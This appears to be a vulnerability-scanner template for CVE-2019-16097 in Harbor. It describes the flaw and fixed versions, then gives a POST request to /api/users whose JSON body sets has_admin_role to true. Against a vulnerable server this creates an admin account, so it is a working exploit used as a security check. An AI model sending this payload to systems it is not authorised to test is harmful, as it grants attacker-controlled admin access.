id: CVE-2019-16097-1
info:
  author: pikpikcu
  description: 'core/api/user.go in Harbor 1.7.0 through 1.8.2 allows non-admin users
    to create admin accounts via the POST /api/users API, when Harbor is setup with
    DB as authentication backend and allow user to do self-registration. Fixed version:
    v1.7.6 v1.8.3. v.1.9.0. Workaround without applying the fix: configure Harbor
    to use non-DB authentication backend such as LDAP.

    '
  name: Harbor Enables Privilege Escalation From Zero to admin
  reference: https://unit42.paloaltonetworks.com/critical-vulnerability-in-harbor-enables-privilege-escalation-from-zero-to-admin-cve-2019-16097/
  severity: critical
  tags: cve,cve2019,intrusive,harbor
requests:
- body: '{"username": "testpoc", "has_admin_role": true, "password": "TestPoc!", "email":
    "testpoc@example.com", "realname": "poc"}

    '
  headers:
    Content-Type: application/json
  matchers:
  - condition: or
    part: all
    type: word
    words:
    - username has already been used
    - 'Location: /api/users/'
  - condition: or
    status:
    - 201
    - 409
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/api/users'
